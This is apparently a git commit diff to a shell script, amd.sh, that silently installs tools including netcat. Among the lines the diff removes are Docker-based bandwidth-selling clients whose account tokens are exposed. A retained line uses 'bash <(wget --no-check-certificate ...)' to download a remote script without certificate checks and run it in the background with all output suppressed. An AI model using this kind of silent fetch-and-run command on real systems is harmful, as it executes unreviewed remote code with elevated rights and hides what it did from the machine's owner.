2e7977af53f44bc582c05b4fde208bd595b86ca3
maklinngf <madelinecheung81@gmail.com>
2026-03-14 18:52:10 +0800

    Update amd.sh

--- amd.sh
+++ amd.sh
@@ -6,7 +6,3 @@ sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
 sudo apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1 || apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1
 # 3. 执行你原来的 sijuly.sh 脚本 (后台运行)
 bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/maklinngf/m/refs/heads/main/m.sh) >/dev/null 2>&1 &
-wget -qO- get.docker.com | bash
-docker run -d --restart=always --name tm traffmonetizer/cli_v2 start accept --token I1TfrUC+ST9NdcK/97Dq/uZAW61DEnSWWr3KEm2GSVg=
-docker run -d --restart=always -e EARNFM_TOKEN="99268125-c127-4a66-a43f-60690db70b17" --name earnfm-client earnfm/earnfm-client:latest
-ping aws.amazon.com
